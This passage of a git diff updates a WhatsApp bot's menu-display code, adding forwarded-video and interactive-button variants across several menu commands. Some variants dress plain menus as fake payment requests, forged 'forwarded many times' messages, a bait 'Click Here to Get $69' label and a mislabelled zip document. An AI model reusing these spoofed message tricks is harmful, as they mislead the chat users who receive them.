+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${photooxymenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -8359,7 +10027,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -8405,7 +10073,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -8414,252 +10082,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
 }
-break
-case 'ephoto360menu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${ephoto360menu(prefix, hituet)}`
-if (typemenu === 'v1') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                        caption: xmenu_oh
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v2') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        text: xmenu_oh,
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                                sourceUrl: websitex,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: m
-                    })
-                }   if (typemenu === 'v3') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-                        caption: xmenu_oh
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v4') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-                        caption: xmenu_oh,
-                        gifPlayback: true
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v5') {
-                    XeonBotInc.relayMessage(m.chat, {
-                        scheduledCallCreationMessage: {
-                            callType: "AUDIO",
-                            scheduledTimestampMs: 1200,
-                            title: xmenu_oh
-                        }
-                    }, {})
-                } else if (typemenu === 'v6') {
-                    XeonBotInc.relayMessage(m.chat,  {
-                       requestPaymentMessage: {
-                          currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
-                          requestFrom: m.sender,
-                          noteMessage: {
-                             extendedTextMessage: {
-                                text: xmenu_oh,
-                                contextInfo: {
-                                   externalAdReply: {
-                                       showAdAttribution: true
-                                   }
-                                }
-                             }
-                          }
-                       }
-                    }, {})
-                } else if (typemenu === 'v7') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        document: {
-                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
-                        },
-                        caption: xmenu_oh,
-                        mimetype: 'application/zip',
-                        fileName: ownername,
-                        fileLength: "99999999999",
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                                sourceUrl: websitex,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: fstatus 
-                    })
-                } else if (typemenu === 'v8') {
-                	XeonBotInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-      gifPlayback: true,
-      caption: xmenu_oh,
-      contextInfo: {
-      externalAdReply: {
-      title: botname,
-      body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
-      sourceUrl: ``,
-      mediaType: 1,
-      renderLargerThumbnail: true
-      }
-      }
-      }, {
-                        quoted: m
-                    })
-                    }
 }
-break
-case 'makermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${makermenu(prefix, hituet)}`
-if (typemenu === 'v1') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                        caption: xmenu_oh
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v2') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        text: xmenu_oh,
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                                sourceUrl: websitex,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: m
-                    })
-                }   if (typemenu === 'v3') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-                        caption: xmenu_oh
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v4') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-                        caption: xmenu_oh,
-                        gifPlayback: true
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v5') {
-                    XeonBotInc.relayMessage(m.chat, {
-                        scheduledCallCreationMessage: {
-                            callType: "AUDIO",
-                            scheduledTimestampMs: 1200,
-                            title: xmenu_oh
-                        }
-                    }, {})
-                } else if (typemenu === 'v6') {
-                    XeonBotInc.relayMessage(m.chat,  {
-                       requestPaymentMessage: {
-                          currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
-                          requestFrom: m.sender,
-                          noteMessage: {
-                             extendedTextMessage: {
-                                text: xmenu_oh,
-                                contextInfo: {
-                                   externalAdReply: {
-                                       showAdAttribution: true
-                                   }
-                                }
-                             }
-                          }
-                       }
-                    }, {})
-                } else if (typemenu === 'v7') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        document: {
-                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
-                        },
-                        caption: xmenu_oh,
-                        mimetype: 'application/zip',
-                        fileName: ownername,
-                        fileLength: "99999999999",
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                                sourceUrl: websitex,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: fstatus 
-                    })
-                } else if (typemenu === 'v8') {
-                	XeonBotInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-      gifPlayback: true,
-      caption: xmenu_oh,
-      contextInfo: {
-      externalAdReply: {
-      title: botname,
-      body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
-      sourceUrl: ``,
-      mediaType: 1,
-      renderLargerThumbnail: true
-      }
-      }
-      }, {
-                        quoted: m
-                    })
-                    }
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'nsfwmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${nsfwmenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${nsfwmenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -8710,7 +10231,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -8756,7 +10277,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -8765,18 +10286,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'animemenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${animemenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${animemenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -8827,7 +10435,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -8873,7 +10481,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -8882,18 +10490,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'stickermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${stickermenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${stickermenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -8944,7 +10639,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -8990,7 +10685,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -8999,18 +10694,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'databasemenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${databasemenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${databasemenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -9061,7 +10843,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -9107,7 +10889,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -9116,18 +10898,513 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
+}
+break
+case 'searchmenu': {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${searchmenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v2') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        text: xmenu_oh,
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: m
+                    })
+                }   if (typemenu === 'v3') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v4') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh,
+                        gifPlayback: true
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v5') {
+                    XeonBotInc.relayMessage(m.chat, {
+                        scheduledCallCreationMessage: {
+                            callType: "AUDIO",
+                            scheduledTimestampMs: 1200,
+                            title: xmenu_oh
+                        }
+                    }, {})
+                } else if (typemenu === 'v6') {
+                    XeonBotInc.relayMessage(m.chat,  {
+                       requestPaymentMessage: {
+                          currencyCodeIso4217: 'INR',
+                          amount1000: '9999999900',
+                          requestFrom: m.sender,
+                          noteMessage: {
+                             extendedTextMessage: {
+                                text: xmenu_oh,
+                                contextInfo: {
+                                   externalAdReply: {
+                                       showAdAttribution: true
+                                   }
+                                }
+                             }
+                          }
+                       }
